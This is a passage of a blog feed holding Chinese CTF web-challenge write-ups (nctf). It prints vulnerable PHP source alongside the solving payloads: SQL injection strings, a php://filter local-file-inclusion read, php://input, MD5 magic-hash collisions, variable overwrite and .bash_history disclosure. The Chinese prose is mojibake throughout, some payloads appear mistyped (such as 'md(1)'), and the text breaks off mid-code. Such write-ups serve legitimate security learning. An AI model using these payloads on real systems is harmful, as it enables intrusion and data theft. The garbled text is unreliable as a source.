å‡½æ•°æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ã€‚</p><p><strong>æ³¨é‡Šï¼š</strong>strcmp() å‡½æ•°æ˜¯äºŒè¿›åˆ¶å®‰å…¨çš„ï¼Œä¸”å¯¹å¤§å°å†™æ•æ„Ÿã€‚</p><p><strong>æç¤ºï¼š</strong>è¯¥å‡½æ•°ä¸ <a href="https://www.w3school.com.cn/php/func_string_strncmp.asp" target="_blank" rel="noopener">strncmp()</a> å‡½æ•°ç±»ä¼¼ï¼Œä¸åŒçš„æ˜¯ï¼Œé€šè¿‡ strncmp() æ‚¨å¯ä»¥æŒ‡å®šæ¯ä¸ªå­—ç¬¦ä¸²ç”¨äºæ¯”è¾ƒçš„å­—ç¬¦æ•°ã€‚</p><p><img src="https://i.loli.net/2020/11/30/4fUTpLQAMK6eYiX.png" srcset="/img/loading.gif" alt></p><p>åªæœ‰pass==pass1æ—¶æ‰æ˜¾ç¤ºflag</p><p>æ„Ÿè§‰è·Ÿä¹‹å‰çš„å˜é‡è¦†ç›–ç›¸ä¼¼</p><p><img src="https://i.loli.net/2020/11/30/AowyefxikHEWvuP.png" srcset="/img/loading.gif" alt></p><p><strong>çŸ¥è¯†ç‚¹ï¼š</strong><br>ã€€ã€€strcmp()å‡½æ•° ï¼šphp5.3ä¹‹å‰çš„strcmpçš„æ¼æ´ï¼Œå½“å‚æ•°ä¸­çš„ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¯¹è±¡æˆ–è€…æ•°ç»„æ—¶ï¼Œå‡½æ•°ä¼šè¿”å›0ï¼›<br>ã€€ã€€hackbarçš„ä½¿ç”¨ï¼Œpostæ–¹æ³•<br>ã€€ã€€phpå¼±ç±»å‹ï¼Œæ•°ç»„çš„ä½¿ç”¨ã€‚</p><p>å‚è€ƒï¼š <a href="https://www.cnblogs.com/islsy/p/10667426.html" target="_blank" rel="noopener">https://www.cnblogs.com/islsy/p/10667426.html</a> </p><h2 id="èµ·åå­—çœŸéš¾"><a href="#èµ·åå­—çœŸéš¾" class="headerlink" title="èµ·åå­—çœŸéš¾"></a>èµ·åå­—çœŸéš¾</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">noother_says_correct</span><span class="hljs-params">($number)</span></span><span class="hljs-function"></span>&#123;       $one = ord(<span class="hljs-string">'1'</span>);       $nine = ord(<span class="hljs-string">'9'</span>);       <span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; strlen($number); $i++)       &#123;                  $digit = ord($number&#123;$i&#125;);               <span class="hljs-keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) <span class="hljs-comment">//numberä¸­çš„æ•°å­—ä¸èƒ½åœ¨1-9</span>               &#123;                       <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;               &#125;       &#125;          <span class="hljs-keyword">return</span> $number == <span class="hljs-string">'54975581388'</span>; <span class="hljs-comment">//numberçš„å€¼ç­‰äº54975581388ï¼Œä¸ä¹‹å‰ifè¯­å¥çŸ›ç›¾</span>&#125;$flag=<span class="hljs-string">'*******'</span>;<span class="hljs-keyword">if</span>(noother_says_correct($_GET[<span class="hljs-string">'key'</span>]))   <span class="hljs-keyword">echo</span> $flag;<span class="hljs-keyword">else</span>    <span class="hljs-keyword">echo</span> <span class="hljs-string">'access denied'</span>;<span class="hljs-meta">?&gt;</span></code></pre></div><p>å°è¯•å°†54975581388è½¬æˆåå…­è¿›åˆ¶</p><p>0xccccccccc,  cçš„aå€¼ä¸º12ï¼Œæ»¡è¶³ifåˆ¤æ–­è¯­å¥</p><p><code>?key=0xccccccccc</code></p><h2 id="sqlinject"><a href="#sqlinject" class="headerlink" title="sqlinject"></a>sqlinject</h2><p>æŸ¥çœ‹æºç </p><div class="hljs"><pre><code class="hljs php">&lt;!--<span class="hljs-comment">#GOAL: login as admin,then get the flag;</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">require</span> <span class="hljs-string">'db.inc.php'</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clean</span><span class="hljs-params">($str)</span></span>&#123;  <span class="hljs-keyword">if</span>(get_magic_quotes_gpc())&#123;  <span class="hljs-comment">//é˜²æ­¢æ³¨å…¥</span>$str=stripslashes($str); <span class="hljs-comment">//æ·»åŠ  \</span>&#125;<span class="hljs-keyword">return</span> htmlentities($str, ENT_QUOTES);<span class="hljs-comment">//è¿‡æ»¤æ‰å•å¼•å·ï¼ŒåŒå¼•å·ï¼Œæˆ–è€…å…¼è€Œæœ‰ä¹‹</span>&#125;$username = @clean((string)$_GET[<span class="hljs-string">'username'</span>]);<span class="hljs-comment">//å¯¹è·å–çš„å‚æ•°è¿›è¡Œäº†å¤„ç†</span>$password = @clean((string)$_GET[<span class="hljs-string">'password'</span>]);$query=<span class="hljs-string">'SELECT * FROM users WHERE name=\''</span>.$username.<span class="hljs-string">'\' AND pass=\''</span>.$password.<span class="hljs-string">'\';'</span>;<span class="hljs-comment">//å­˜åœ¨æ³¨å…¥çš„è¯­å¥</span>$result=mysql_query($query);<span class="hljs-keyword">if</span>(!$result || mysql_num_rows($result) &lt; <span class="hljs-number">1</span>)&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">'Invalid password!'</span>);&#125;<span class="hljs-keyword">echo</span> $flag;--&gt;</code></pre></div><p> <strong>magic_quotes_gpcå‡½æ•°åœ¨phpä¸­çš„ä½œç”¨æ˜¯åˆ¤æ–­è§£æç”¨æˆ·æç¤ºçš„æ•°æ®ï¼Œå¦‚åŒ…æ‹¬æœ‰:postã€getã€cookieè¿‡æ¥çš„æ•°æ®å¢åŠ è½¬ä¹‰å­—ç¬¦â€œ\â€ï¼Œä»¥ç¡®ä¿è¿™äº›æ•°æ®ä¸ä¼šå¼•èµ·ç¨‹åºï¼Œç‰¹åˆ«æ˜¯æ•°æ®åº“è¯­å¥å› ä¸ºç‰¹æ®Šå­—ç¬¦å¼•èµ·çš„æ±¡æŸ“è€Œå‡ºç°è‡´å‘½çš„é”™è¯¯</strong> </p><p> <code>SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;</code> </p><p> åæ–œæ é‡åˆ°å•å¼•å·åï¼Œèµ·åˆ°è½¬ä¹‰ä½œç”¨ï¼Œå®é™…sqlè¯­å¥å¦‚ä¸‹</p><p><code>SELECT * FROM users WHERE name=&#39;.$username.&#39; AND pass=&#39;.$password.&#39;;</code> </p><p>è¿™é‡Œæ³¨å…¥ä¸ä¹‹å‰çš„æ³¨å…¥ä¸åŒï¼Œè¿™é‡Œé’ˆå¯¹çš„æ˜¯password</p><p><code>SELECT * FROM users WHERE name=&#39; \&#39; AND pass=&#39;  or 1=1 --+&#39;;</code></p><p><code>\&#39; AND pass=</code> ä½œä¸ºname å‚æ•°çš„å€¼</p><p>æ‰€ä»¥æ„é€ ?name=&amp;password=or 1=1 â€“+</p><p><img src="/2020/09/02/nctf-2/sql2.png" srcset="/img/loading.gif" alt></p><h2 id="SQLæ³¨å…¥2"><a href="#SQLæ³¨å…¥2" class="headerlink" title="SQLæ³¨å…¥2"></a>SQLæ³¨å…¥2</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123; <span class="hljs-comment">//post æ–¹å¼æ¥æ”¶ä¸¤ä¸ªå‚æ•°</span>   mysql_connect(SAE_MYSQL_HOST_M . <span class="hljs-string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);  mysql_select_db(SAE_MYSQL_DB);  $user = $_POST[user];  $pass = md5($_POST[pass]);<span class="hljs-comment">//å¯¹pass  md5åŠ å¯†</span>  $query = @mysql_fetch_array(mysql_query(<span class="hljs-string">"select pw from ctf where user='$user'"</span>));<span class="hljs-comment">//è·å–pwå­—æ®µçš„å€¼</span>  <span class="hljs-keyword">if</span> (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; <span class="hljs-comment">// æ¯”è¾ƒpasså’Œpw</span>      <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"</span>;  &#125;  <span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">echo</span>(<span class="hljs-string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);  &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>poyload:</p><p><code>user= &#39; union select md(1) &amp;pass=1</code></p><p><code>select pw from ctf where user=&#39;&#39; union select md(1)</code> </p><p>æ­¤æŸ¥è¯¢è¯­å¥è·å¾—æˆ‘pwå€¼ä¸ºmd(1),æ‰€ä»¥<code>if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw])))</code>è¯­å¥æˆç«‹ï¼Œæ˜¾ç¤ºflag</p><p>(è¿˜æ²¡å®Œå…¨ç†è§£)</p><h2 id="ç»¼åˆé¢˜"><a href="#ç»¼åˆé¢˜" class="headerlink" title="ç»¼åˆé¢˜"></a>ç»¼åˆé¢˜</h2><p> é¦–é¡µä¸­ç»™å‡ºå¾ˆé•¿çš„<code>jsfuck</code>ï¼Œå¯ä»¥ä½¿ç”¨æµè§ˆå™¨çš„<code>console</code>è§£ç  ,ç»™å‡ºä¸€ä¸ªé¡µé¢</p><p>è®¿é—® <code>1bc29b36f623ba82aaf6724fd3b16718.php</code> </p><p><img src="https://i.loli.net/2020/11/30/wxG2Wpteo6hr1vy.png" srcset="/img/loading.gif" alt></p><p>æç¤ºåœ¨headeré‡Œ</p><p><img src="/2020/09/02/nctf-2/ch1.png" srcset="/img/loading.gif" alt></p><p>æŸ¥çœ‹header</p><p><img src="https://i.loli.net/2020/11/30/6qnrk7WSDdpAh8L.png" srcset="/img/loading.gif" alt></p><p> <code>history of bash</code> å¦‚æœä½¿ç”¨çš„æ˜¯<code>bash</code>ï¼Œåœ¨å®¶ç›®å½•ä¸­ä¼šç”Ÿæˆ<code>.bash_history</code>æ–‡ä»¶ç”¨æ¥ä¿å­˜å†å²å‘½ä»¤ã€‚<br>è®¿é—®<code>.bash_history</code>æ–‡ä»¶ï¼Œå¯ä»¥å¾—åˆ°è¿™æ ·çš„å†å²å‘½ä»¤ </p><p>url: <a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history</a> </p><p>è·å¾—<code>zip -r flagbak.zip ./*</code></p><p>è®¿é—® <a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip</a></p><h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h2><p>æŸ¥çœ‹æºç è·å–è¢«æ³¨é‡Šçš„å†…å®¹</p><div class="hljs"><pre><code class="hljs php">$file = $_GET[<span class="hljs-string">'file'</span>];<span class="hljs-keyword">if</span>(@file_get_contents($file) == <span class="hljs-string">"meizijiu"</span>)&#123;    <span class="hljs-keyword">echo</span> $nctf;&#125;</code></pre></div><p>åˆ†æå¯å¾—</p><p><strong>é€šè¿‡getæ–¹å¼ä¼ é€’<code>flle</code>=æ–‡ä»¶å</strong><br><strong>å¹¶ä¸”è¿™ä¸ªæ–‡ä»¶çš„å†…å®¹==â€˜meizijiuâ€™</strong><br><strong>å¦‚æœç­‰äºå°±æ‰“å°flag</strong> </p><p>phpä¼ªåè®®<code>php://input</code>æ¥æ„é€ åŸå§‹æ•°æ®çš„åªè¯»æµ </p><p><img src="https://i.loli.net/2020/11/30/gK2Y5WGCklp6qtx.png" srcset="/img/loading.gif" alt></p><h2 id="å˜é‡è¦†ç›–"><a href="#å˜é‡è¦†ç›–" class="headerlink" title="å˜é‡è¦†ç›–"></a>å˜é‡è¦†ç›–</h2><p>å‚è€ƒ <a href="https://blog.csdn.net/niexinming/article/details/52637773?utm_source=blogxgwz1" target="_blank" rel="noopener">https://blog.csdn.net/niexinming/article/details/52637773?utm_source=blogxgwz1</a> </p><p>æºç </p><div class="hljs"><pre><code class="hljs php">&lt;!--<span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $key =&gt; $value)&#123;          $$key = $value;  &#125;  <span class="hljs-keyword">if</span>($name == <span class="hljs-string">"meizijiu233"</span>)&#123;    <span class="hljs-keyword">echo</span> $flag;&#125;--&gt;</code></pre></div><div class="hljs"><pre><code class="hljs routeros">GET:?<span class="hljs-attribute">name</span>=meizijiu233</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
      <tag>å¼±ç±»å‹</tag>
      
      <tag>php</tag>
      
      <tag>å˜é‡è¦†ç›–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nctf</title>
    <link href="/2020/08/29/nctf/"/>
    <url>/2020/08/29/nctf/</url>
    
    <content type="html"><![CDATA[<h1 id="nctf-1"><a href="#nctf-1" class="headerlink" title="nctf-1"></a>nctf-1</h1><a id="more"></a><h2 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h2><p>æŸ¥çœ‹æºç å³å¯çœ‹åˆ°flag</p><h2 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h2><p>ä¸€é“ç®€å•çš„md5æ¼æ´é¢˜ç›®</p><p><strong>md5å‡½æ•°æ¼æ´</strong></p><p>æºç </p><div class="hljs"><pre><code class="hljs php">$md51 = md5(<span class="hljs-string">'QNKCDZO'</span>);$a = @$_GET[<span class="hljs-string">'a'</span>];$md52 = @md5($a);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($a))&#123;<span class="hljs-keyword">if</span> ($a != <span class="hljs-string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">"nctf&#123;*****************&#125;"</span>;&#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">"false!!!"</span>;&#125;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"please input a"</span>;&#125;</code></pre></div><p>å³ä½¿ç”¨getæ–¹å¼ä¼ é€’ä¸€ä¸ªå‚æ•°a,ä½¿å¾—açš„å€¼ä¸ç­‰äº<code>QNKCDZO</code>ä½†æ˜¯äºŒè€…çš„md5å€¼ç›¸åŒ</p><p>PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€!=â€æˆ–â€==â€æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ã€‚</p><p>å¸¸è§çš„payloadæœ‰</p><div class="hljs"><pre><code class="hljs c++">QNKCDZO<span class="hljs-number">240610708</span>s878926199as155964671as214587387as214587387a sha1(str)sha1('aaroZmOk')  sha1('aaK1STfY')sha1('aaO8zKZF')sha1('aa3OFF9m')</code></pre></div><h2 id="ç­¾åˆ°2"><a href="#ç­¾åˆ°2" class="headerlink" title="ç­¾åˆ°2"></a>ç­¾åˆ°2</h2><p>æç¤ºè¾“å…¥å£ä»¤ï¼Œå°è¯•è¾“å…¥å‘ç°åªèƒ½è¾“å…¥åä¸ªå­—æ¯ï¼Œä½†æ˜¯å£ä»¤æœ‰11ä¸ªå­—æ¯</p><p>F12å®¡æŸ¥å…ƒç´ ï¼Œä¿®æ”¹è¾“å…¥æ¡†çš„<code>maxlength</code>å€¼ï¼Œå¤§äº11å³å¯</p><p>å†æ¬¡è¾“å…¥å£ä»¤å³å¯ã€‚</p><p>è€ƒç‚¹ä¸ºå‰ç«¯ä»£ç ä¿®æ”¹</p><h2 id="è¿™é¢˜ä¸æ˜¯WEB"><a href="#è¿™é¢˜ä¸æ˜¯WEB" class="headerlink" title="è¿™é¢˜ä¸æ˜¯WEB"></a>è¿™é¢˜ä¸æ˜¯WEB</h2><p>è¿™é“é¢˜è¿˜çœŸä¸æ˜¯web</p><p>è¿›å…¥é¢˜ç›®é“¾æ¥ï¼Œå‘ç°ä¸€å¼ åŠ¨å›¾ï¼Œæœ¬èƒ½çš„å°†å…¶æ‹–å…¥åŠ¨å›¾æŸ¥çœ‹å™¨ç§ï¼Œç»“æœä»€ä¹ˆéƒ½æ²¡å‘ç°ï¼Œäºæ˜¯æ‰“å¼€winhex</p><p>åœ¨æœ€åå‘ç°flag</p><h2 id="å±‚å±‚é€’è¿›"><a href="#å±‚å±‚é€’è¿›" class="headerlink" title="å±‚å±‚é€’è¿›"></a>å±‚å±‚é€’è¿›</h2><p> é¢˜ç›®ä¸ºå±‚å±‚é€’è¿›ï¼Œé€šè¿‡<strong>F12</strong>ä¸­<strong>Sources</strong>åŠŸèƒ½ï¼ŒæŸ¥çœ‹ç½‘ç«™çš„åŒ…å«æƒ…å†µï¼Œå‘ç°åˆ°å¯ç–‘åœ°å€ï¼š<code>SO.html</code>ï¼ŒæŸ¥çœ‹å‘ç°ç›¸ä¼¼å¯ä»¥åœ°å€ï¼Œæœ€ååœ¨<code>404.html</code>æºç ä¸­å¾—åˆ°<strong>flag</strong>ï¼ˆç«–æ’æ’å…¥åœ¨æ ‡ç­¾ä¸­ï¼‰ï¼š </p><p><img src="https://i.loli.net/2020/11/30/4W9UOAMgLTohsJP.png" srcset="/img/loading.gif" alt></p><h2 id="å•èº«äºŒåå¹´"><a href="#å•èº«äºŒåå¹´" class="headerlink" title="å•èº«äºŒåå¹´"></a>å•èº«äºŒåå¹´</h2><p><strong>tip:åœ¨è¿™é‡Œæ‰¾key</strong></p><p>ç‚¹å‡»å‘ç°urlæ”¹å˜ï¼Œè·³è½¬åˆ°äº†å¦ä¸€ä¸ªé¡µé¢</p><p>bpæŠ“åŒ…è¯•è¯•ï¼Œgoä¸€ä¸‹ï¼Œç›¸åº”åŒ…ä¸­å‡ºç°flag</p><p><img src="/2020/08/29/nctf/ds1.png" srcset="/img/loading.gif" alt></p><h2 id="phpencode"><a href="#phpencode" class="headerlink" title="phpencode"></a>phpencode</h2><p>ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯è§£ç ï¼Œç»“æœå‘ç°ä»£ç é€»è¾‘ä¸å¯¹ï¼Œç›´æ¥è¿è¡Œphpä»£ç ï¼Œå‡ºé”™</p><p>å°†æœ€åçš„<code>eval</code>æ”¹ä¸º<code>echo</code>,æäº¤è¿è¡Œå³å¯</p><p><img src="https://i.loli.net/2020/11/30/iXYv8R4MDTfr1ul.png" srcset="/img/loading.gif" alt></p><h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><p> <strong>é»‘ç›’åˆ¤æ–­æ–¹æ³•ï¼š<br>å•çº¯çš„ä»URLåˆ¤æ–­çš„è¯ï¼ŒURLä¸­pathã€dirã€fileã€pagã€pageã€archiveã€pã€engã€è¯­è¨€æ–‡ä»¶ç­‰ç›¸å…³å…³é”®å­—çœ¼çš„æ—¶å€™,å¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ã€‚</strong> </p><p> æ ¹æ®<strong>PHPä¼ªåè®®</strong>å°è¯•æ„é€ å¦‚ä¸‹<strong>Payloadï¼š</strong><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code>ï¼Œå°†<strong>index.php</strong>çš„æºç ç»è¿‡<strong>Base64ç¼–ç </strong>è¾“å‡º </p><p><code>PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4=</code></p><p>base64è§£ç </p><div class="hljs"><pre><code class="hljs php+HTML">&lt;html&gt;    &lt;title&gt;asdf&lt;&#x2F;title&gt;&lt;?phperror_reporting(0);if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125;$file&#x3D;$_GET[&#39;file&#39;];if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;echo &quot;Oh no!&quot;;exit();&#125;include($file); &#x2F;&#x2F;flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;&#x2F;html&gt;</code></pre></div><h2 id="å•èº«ä¸€ç™¾å¹´ä¹Ÿæ²¡ç”¨"><a href="#å•èº«ä¸€ç™¾å¹´ä¹Ÿæ²¡ç”¨" class="headerlink" title="å•èº«ä¸€ç™¾å¹´ä¹Ÿæ²¡ç”¨"></a>å•èº«ä¸€ç™¾å¹´ä¹Ÿæ²¡ç”¨</h2><p>ä¸å•èº«äºŒåå¹´ä¸€æ ·ï¼ŒæŠ“åŒ…å³å¯</p><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p> <strong>Cookieï¼Œæœ‰æ—¶ä¹Ÿç”¨å…¶å¤æ•°å½¢å¼ <a href="https://baike.baidu.com/item/Cookies/187064" target="_blank" rel="noopener">Cookies</a>ã€‚ç±»å‹ä¸ºâ€œ</strong>å°å‹æ–‡æœ¬æ–‡ä»¶<strong>â€ï¼Œæ˜¯æŸäº›ç½‘ç«™ä¸ºäº†è¾¨åˆ«ç”¨æˆ·èº«ä»½ï¼Œè¿›è¡Œ<a href="https://baike.baidu.com/item/Session/479100" target="_blank" rel="noopener">Session</a>è·Ÿè¸ªè€Œå‚¨å­˜åœ¨ç”¨æˆ·æœ¬åœ°ç»ˆç«¯ä¸Šçš„æ•°æ®ï¼ˆé€šå¸¸ç»è¿‡åŠ å¯†ï¼‰ï¼Œç”±ç”¨æˆ·<a href="https://baike.baidu.com/item/å®¢æˆ·ç«¯/101081" target="_blank" rel="noopener">å®¢æˆ·ç«¯</a>è®¡ç®—æœºæš‚æ—¶æˆ–æ°¸ä¹…ä¿å­˜çš„ä¿¡æ¯ ã€‚</strong></p><p> <strong>TIP: 0==not</strong> </p><p>bpæŠ“åŒ…ï¼Œå°†<code>cookie:login = 0</code>æ”¹<code>cookie:login=1</code>   go</p><h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><p>è¿›å…¥é¢˜ç›®ï¼Œæç¤ºrobotsåè®®</p><p><strong>robotsåè®®ä¹Ÿå«robots.txtï¼ˆç»Ÿä¸€å°å†™ï¼‰æ˜¯ä¸€ç§å­˜æ”¾äº<a href="https://baike.baidu.com/item/ç½‘ç«™" target="_blank" rel="noopener">ç½‘ç«™</a>æ ¹ç›®å½•ä¸‹çš„<a href="https://baike.baidu.com/item/ASCII" target="_blank" rel="noopener">ASCII</a>ç¼–ç çš„<a href="https://baike.baidu.com/item/æ–‡æœ¬æ–‡ä»¶" target="_blank" rel="noopener">æ–‡æœ¬æ–‡ä»¶</a>ï¼Œå®ƒé€šå¸¸å‘Šè¯‰ç½‘ç»œ<a href="https://baike.baidu.com/item/æœç´¢å¼•æ“" target="_blank" rel="noopener">æœç´¢å¼•æ“</a>çš„æ¼«æ¸¸å™¨ï¼ˆåˆç§°<a href="https://baike.baidu.com/item/ç½‘ç»œèœ˜è››" target="_blank" rel="noopener">ç½‘ç»œèœ˜è››</a>ï¼‰ï¼Œæ­¤ç½‘ç«™ä¸­çš„å“ªäº›å†…å®¹æ˜¯ä¸åº”è¢«æœç´¢å¼•æ“çš„æ¼«æ¸¸å™¨è·å–çš„ï¼Œå“ªäº›æ˜¯å¯ä»¥è¢«æ¼«æ¸¸å™¨è·å–çš„ã€‚å› ä¸ºä¸€äº›ç³»ç»Ÿä¸­çš„URLæ˜¯å¤§å°å†™æ•æ„Ÿçš„ï¼Œæ‰€ä»¥robots.txtçš„æ–‡ä»¶ååº”ç»Ÿä¸€ä¸ºå°å†™ã€‚robots.txtåº”æ”¾ç½®äºç½‘ç«™çš„æ ¹ç›®å½•ä¸‹ã€‚å¦‚æœæƒ³å•ç‹¬å®šä¹‰æœç´¢å¼•æ“çš„æ¼«æ¸¸å™¨è®¿é—®å­ç›®å½•æ—¶çš„è¡Œä¸ºï¼Œé‚£ä¹ˆå¯ä»¥å°†è‡ªå®šçš„è®¾ç½®åˆå¹¶åˆ°æ ¹ç›®å½•ä¸‹çš„robots.txtï¼Œæˆ–è€…ä½¿ç”¨robots<a href="https://baike.baidu.com/item/å…ƒæ•°æ®" target="_blank" rel="noopener">å…ƒæ•°æ®</a>ï¼ˆMetadataï¼Œåˆç§°å…ƒæ•°æ®ï¼‰ã€‚</strong></p><p><strong>robotsåè®®å¹¶ä¸æ˜¯ä¸€ä¸ªè§„èŒƒï¼Œè€Œåªæ˜¯çº¦å®šä¿—æˆçš„ï¼Œæ‰€ä»¥å¹¶ä¸èƒ½ä¿è¯ç½‘ç«™çš„éšç§ã€‚</strong></p><p>æŸ¥çœ‹robots.txt</p><p>url:<code>http://chinalover.sinaapp.com/web11/robots.txt</code></p><div class="hljs"><pre><code class="hljs php">TIP:sql.php<span class="hljs-comment">//è¿™é‡Œæç¤ºsql.phpçš„æºç å¦‚ä¸‹</span></code></pre></div><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>($_GET[id]) &#123;   mysql_connect(SAE_MYSQL_HOST_M . <span class="hljs-string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);  mysql_select_db(SAE_MYSQL_DB);  $id = intval($_GET[id]);  $query = @mysql_fetch_array(mysql_query(<span class="hljs-string">"select content from ctf2 where id='$id'"</span>));  <span class="hljs-keyword">if</span> ($_GET[id]==<span class="hljs-number">1024</span>) &#123;      <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;no! try again&lt;/p&gt;"</span>;  &#125;  <span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span>($query[content]);  &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>å¤§è‡´æ„æ€ï¼šgetæ–¹å¼ä¼ é€’ä¸€ä¸ªidçš„å‚æ•°,åˆ›å»ºä¸€ä¸ªæ–°çš„å‚æ•°idå­˜æ”¾å–æ•´åçš„å€¼ï¼ˆintval()å‡½æ•°å°†å‚æ•°å˜ä¸ºæ•´å½¢ï¼‰</p><p>ä¹‹åå°†æ–°çš„$idå¸¦å…¥sqlè¯­å¥ä¸­æŸ¥è¯¢ã€‚ifè¯­å¥ä¸­è¯´æ˜ï¼Œgetæ–¹å¼ä¼ é€’çš„å€¼ä¸èƒ½ä¸º1024ã€‚</p><p> <a href="http://chinalover.sinaapp.com/web11/sql.php?id=10" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web11/sql.php?id=10</a> å°è¯•id=10ï¼Œæ— ç»“æœ</p><p>id=1024å‡ºç° no! try againï¼Œè¯´æ˜åªæœ‰id=1024çš„æ—¶å€™æ‰ä¼šæ‰§è¡Œifè¯­å¥</p><p>æƒ³åˆ°äº†intval()å‡½æ•°çš„ä½œç”¨ï¼Œå°è¯•id=1024.1</p><h2 id="GBK-Injection"><a href="#GBK-Injection" class="headerlink" title="GBK Injection"></a>GBK Injection</h2><p>å®½å­—èŠ‚æ³¨å…¥ï¼Œä¹‹å‰å†™è¿‡ã€‚</p><h2 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> ($_GET[<span class="hljs-string">'nctf'</span>])) &#123;       <span class="hljs-keyword">if</span> (@ereg (<span class="hljs-string">"^[1-9]+$"</span>, $_GET[<span class="hljs-string">'nctf'</span>]) === <span class="hljs-keyword">FALSE</span>)           <span class="hljs-keyword">echo</span> <span class="hljs-string">'å¿…é¡»è¾“å…¥æ•°å­—æ‰è¡Œ'</span>;       <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos 